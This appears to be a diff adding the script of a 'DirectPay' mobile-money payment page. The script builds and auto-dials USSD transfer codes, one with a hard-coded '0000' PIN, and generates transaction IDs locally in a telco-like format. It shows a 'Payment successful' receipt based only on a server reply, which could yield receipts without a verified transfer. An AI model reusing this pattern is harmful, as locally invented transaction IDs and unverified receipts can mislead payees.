+                resetMerchantOnly();
+                policyOkFlag = false;
+                policyStatusSpan.innerHTML = "⚠️ Not confirmed";
+                policyStatusSpan.style.color = "#b91c1c";
+                dispBiz.innerText = '—';
+                dispAddr.innerText = '—';
+                dispId.innerText = '—';
+                dispPos.innerText = '—';
+                dispRec.innerText = '—';
+                dispContactName.innerText = '—';
+                dispContactPhone.innerText = '—';
+                txField.value = '';
+                ussdArea.style.display = 'none';
+                feedback.style.display = 'none';
+                regModal.style.display = 'flex';
+                mainContent.classList.add('blurred');
+                // Show the auto-fill button for this reset session
+                autoFillRegBtn.style.display = 'inline-block';
+                // Update button text to reflect it restores previous
+                autoFillRegBtn.innerText = '⚡ Auto-Fill Previous Details';
+                recipientField.value = '';
+                transactionCat.value = '';
+                transactionCatError.innerText = '';
+                receiptModal.classList.remove('active');
+            }
+
+            // ---------- USSD ----------
+            function buildUssd() {
+                const phone = mId.value.trim();
+                const amtVal = amount.value.trim();
+                if (!phone) { showFeedback("Identifier missing", "error"); return null; }
+                if (!amtVal || isNaN(amtVal) || parseInt(amtVal) <= 0) {
+                    amountErr.innerText = "Valid amount needed";
+                    showFeedback("Enter amount", "error");
+                    return null;
+                }
+                amountErr.innerText = "";
+                if (!/^\d{9}$/.test(phone)) { showFeedback("Need 9-digit phone", "error"); return null; }
+                const pref = phone.substring(0, 3);
+                const num = parseInt(amtVal);
+                if (GROUP_ONE.includes(pref)) return `#144*2*1*${phone}*${num}*${num}#`;
+                if (GROUP_TWO.includes(pref)) return `*161*1*1*${phone}*${num}*0000#`;
+                showFeedback(`Prefix ${pref} not supported`, "error");
+                return null;
+            }
+
+            function dialNow(ussd) { window.location.href = `tel:${encodeURIComponent(ussd)}`; }
+
+            function handleRelease() {
+                if (!txField.value) { showFeedback("Generate Transaction ID", "error"); return; }
+                const code = buildUssd();
+                if (code) { ussdCodeSpan.innerText = code;
+                    ussdArea.style.display = 'block';
+                    dialNow(code); } else ussdArea.style.display = 'none';
+            }
+
+            function showFeedback(msg, type) {
+                feedback.style.display = 'block';
+                feedback.innerHTML = msg;
+                feedback.style.background = type === 'error' ? '#fee2e2' : '#e0f2fe';
+                feedback.style.borderLeft = `4px solid ${type === 'error' ? '#dc2626' : '#0284c7'}`;
+                if (type !== 'error') setTimeout(() => feedback.style.display = 'none', 5000);
+            }
+
+            // ---------- RECEIPT ----------
+            function buildReceiptHTML(data) {
+                const now = new Date().toLocaleString();
+                return `
+                    <div class="receipt-title">🧾 DirectPay Receipt</div>
+                    <div class="receipt-subtitle">Transaction confirmed on ${now}</div>
+                    <div class="receipt-content">
+                        <div class="row"><span class="label">Business Name</span><span class="value">${data.businessName}</span></div>
+                        <div class="row"><span class="label">Address</span><span class="value">${data.address}</span></div>
+                        <div class="row"><span class="label">Identifier</span><span class="value">${data.identifier}</span></div>
+                        <div class="row"><span class="label">Occupation</span><span class="value">${data.position}</span></div>
+                        <div class="row"><span class="label">Serial Number</span><span class="value">${data.serialNumber}</span></div>
+                        <div class="row"><span class="label">Amount (Le)</span><span class="value">${data.amount}</span></div>
+                        <div class="row"><span class="label">Recipient Name</span><span class="value">${data.recipientName}</span></div>
+                        <div class="row"><span class="label">Transaction Category</span><span class="value">${data.transactionCategory}</span></div>
+                        <div class="row"><span class="label">Transaction ID</span><span class="value">${data.transactionId}</span></div>
+                        <div class="row"><span class="label">Contact Person</span><span class="value">${data.contactName}</span></div>
+                        <div class="row"><span class="label">Contact Phone</span><span class="value">${data.contactPhone}</span></div>
+                        <div class="row"><span class="label">Policy</span><span class="value">✅ Confirmed</span></div>
+                        <div class="row"><span class="label">Agreement</span><span class="value">${data.agreement}</span></div>
+                        <div class="row"><span class="label">Timestamp</span><span class="value">${now}</span></div>
+                    </div>
+                `;
+            }
+
+            function buildSmsBody(data) {
+                const now = new Date().toLocaleString();
+                return `🧾 DIRECTPAY RECEIPT\n` +
+                    `Business: ${data.businessName}\n` +
+                    `Address: ${data.address}\n` +
+                    `Identifier: ${data.identifier}\n` +
+                    `Serial: ${data.serialNumber}\n` +
+                    `Amount: Le ${data.amount}\n` +
+                    `Recipient: ${data.recipientName}\n` +
+                    `Category: ${data.transactionCategory}\n` +
+                    `TX ID: ${data.transactionId}\n` +
+                    `Contact: ${data.contactName} (${data.contactPhone})\n` +
+                    `Agreement: ${data.agreement}\n` +
+                    `Time: ${now}\n` +
+                    `-- DirectPay --`;
+            }
+
+            let lastReceiptData = null;
+
+            function showReceipt(data) {
+                lastReceiptData = data;
+                receiptBody.innerHTML = buildReceiptHTML(data);
+                receiptModal.classList.add('active');
+            }
+
+            function sendReceiptSms() {
+                if (!lastReceiptData) return;
+                const data = lastReceiptData;
+                const body = buildSmsBody(data);
+                const recipientPhone = data.identifier;
+                const contactPhone = data.contactPhone;
+                const smsUri = `sms:${recipientPhone}?body=${encodeURIComponent(body)}`;
+                window.location.href = smsUri;
+                setTimeout(() => {
+                    if (confirm(`Send receipt to contact person (${contactPhone}) as well?`)) {
+                        const smsContact = `sms:${contactPhone}?body=${encodeURIComponent(body)}`;
+                        window.location.href = smsContact;
+                    }
+                }, 500);
+            }
+
+            function copyReceipt() {
+                if (!lastReceiptData) return;
+                const data = lastReceiptData;
+                const text = buildSmsBody(data);
+                navigator.clipboard.writeText(text).then(() => {
+                    const orig = copyReceiptBtn.innerText;
+                    copyReceiptBtn.innerText = "✅ Copied!";
+                    setTimeout(() => copyReceiptBtn.innerText = orig, 2000);
+                }).catch(() => {
+                    const ta = document.createElement('textarea');
+                    ta.value = text;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    ta.remove();
+                    const orig = copyReceiptBtn.innerText;
+                    copyReceiptBtn.innerText = "✅ Copied!";
+                    setTimeout(() => copyReceiptBtn.innerText = orig, 2000);
+                });
+            }
+
+            // ---------- PAY ----------
+            async function processPay() {
+                feedback.style.display = 'none';
+                ussdArea.style.display = 'none';
+
+                const biz = mBiz.value.trim(),
+                    addr = mAddr.value.trim(),
+                    iden = mId.value.trim(),
+                    pos = mPos.value.trim();
+                const serial = serialField.value.trim(),
+                    amt = amount.value.trim(),
+                    rec = recipientField.value.trim(),
+                    cat = transactionCat.value,
+                    tx = txField.value.trim();
+                const cName = mContactName.value.trim(),
+                    cPhone = mContactPhone.value.trim();
+
+                let agree = null;
+                for (let r of agreeRadios)
+                    if (r.checked) { agree = r.value; break; }
+
+                let clientEmail = "";
+                const stored = localStorage.getItem('clientData');
+                if (stored) { try { clientEmail = JSON.parse(stored).email || ""; } catch (e) {} }
+
+                if (!biz || !addr || !iden || !pos) { showFeedback("Missing client info. Re-register.", "error"); return; }
+                if (!clientEmail) { showFeedback("Email missing. Re-register.", "error"); return; }
+                if (!amt || isNaN(amt) || parseInt(amt) <= 0) { amountErr.innerText = "Valid amount";
+                    showFeedback("Enter amount", "error"); return; }
+                if (!rec) { showFeedback("Recipient name missing", "error"); return; }
+                if (!cat) { transactionCatError.innerText = "Please select a transaction category.";
+                    showFeedback("Select transaction category", "error"); return; }
+                transactionCatError.innerText = '';
+                if (!tx || !/^NW\d{7}\.\d{5}\.M\d{7}$/.test(tx)) { txErr.innerText = "Invalid TX";
+                    showFeedback("Invalid Transaction ID", "error"); return; }
+                if (agree !== "Yes") { showFeedback("Must agree to transaction agreement", "error"); return; }
+                if (!policyOkFlag) { showFeedback("Please agree to policy", "error"); return; }
+                if (!serial || serial === "--") { showFeedback("Serial number missing", "error"); return; }
+                if (!cName || !cPhone) { showFeedback("Contact person details missing. Re-register.", "error"); return; }
+
+                const formData = new FormData();
+                formData.append("type", "merchant_registration");
+                formData.append("business_name", biz);
+                formData.append("address", addr);
+                formData.append("identifier", iden);
+                formData.append("position", pos);
+                formData.append("email", clientEmail);
+                formData.append("serial_number", serial);
+                formData.append("amount", amt);
+                formData.append("recipient_name", rec);
+                formData.append("transaction_category", cat);
+                formData.append("transaction_id", tx);
+                formData.append("transaction_agreement", agree);
+                formData.append("policy_confirmed", "Yes");
+                formData.append("contact_name", cName);
+                formData.append("contact_phone", cPhone);
+                if (stored) formData.append("full_client_data", stored);
+
+                pay.innerHTML = "⏳ Processing...";
+                pay.disabled = true;
+                try {
+                    const res = await fetch(MERCHANT_ENDPOINT, { method: "POST", body: formData, headers: { 'Accept': 'application/json' } });
+                    if (res.ok) {
+                        const receiptData = {
+                            businessName: biz,
+                            address: addr,
+                            identifier: iden,
+                            position: pos,
+                            serialNumber: serial,
+                            amount: amt,
+                            recipientName: rec,
+                            transactionCategory: cat,
+                            transactionId: tx,
+                            contactName: cName,
+                            contactPhone: cPhone,
+                            agreement: agree
+                        };
+                        showFeedback(`✅ Payment successful! Serial: ${serial} | TX: ${tx}`, "success");
+                        showReceipt(receiptData);
+                        resetMerchantOnly();
+                    } else {
+                        let err = await res.text();
+                        showFeedback(`❌ Error: ${err.substring(0, 100)}`, "error");
+                    }
+                } catch (e) { showFeedback(`Network error: ${e.message}`, "error"); } finally { pay.innerHTML = "💰 PAY";
+                    pay.disabled = false; }
+            }
+
+            // ---------- event binding ----------
+            regBtn.onclick = completeRegistration;
+            resetAllBtn.onclick = fullReset;
+            genTx.onclick = () => { txField.value = genTxId();
+                txErr.innerText = "";
+                showFeedback("New TX ID generated", "info"); };
+            release.onclick = handleRelease;
+            copyUssd.onclick = () => {
+                if (ussdCodeSpan.innerText) { navigator.clipboard.writeText(ussdCodeSpan.innerText);
+                    copyUssd.innerText = "✅ Copied!";
+                    setTimeout(() => copyUssd.innerText = "📋 Copy", 1500); }
+            };
+            dialUssd.onclick = () => { if (ussdCodeSpan.innerText) dialNow(ussdCodeSpan.innerText);
+                else showFeedback("No USSD", "error"); };
+            pay.onclick = processPay;
+
+            sendReceiptSmsBtn.onclick = sendReceiptSms;
+            copyReceiptBtn.onclick = copyReceipt;
+            closeReceiptBtn.onclick = () => receiptModal.classList.remove('active');
+
+            amount.oninput = () => {
+                if (amount.value && parseInt(amount.value) > 0) amountErr.innerText = "";
+                else if (amount.value) amountErr.innerText = "Positive number";
+                else amountErr.innerText = "";
+            };
+
+            popupId.oninput = () => {
+                const v = popupId.value.trim();
+                if (/^\d{9}$/.test(v)) idHint.innerText = "✓ Valid phone";
+                else if (/^[A-Za-z0-9]{6}$/.test(v)) idHint.innerText = "✓ Valid agent code";
+                else if (v.length > 0) idHint.innerText = "⚠️ 9 digits or 6 chars";
+                else idHint.innerText = "";
+            };
+
+            popupContactPhone.oninput = () => {
+                const v = popupContactPhone.value.trim();
+                if (v.length > 0 && !/^\d{9}$/.test(v)) {
+                    popupContactPhoneError.innerText = "Must be exactly 9 digits.";
+                } else {
+                    popupContactPhoneError.innerText = "";
+                }
+            };
+
+            transactionCat.onchange = () => {
+                if (transactionCat.value) transactionCatError.innerText = '';
+            };
+
+            loadSerial();
+            loadSession();
+        })();
+    </script>
+
+</body>
+</html>
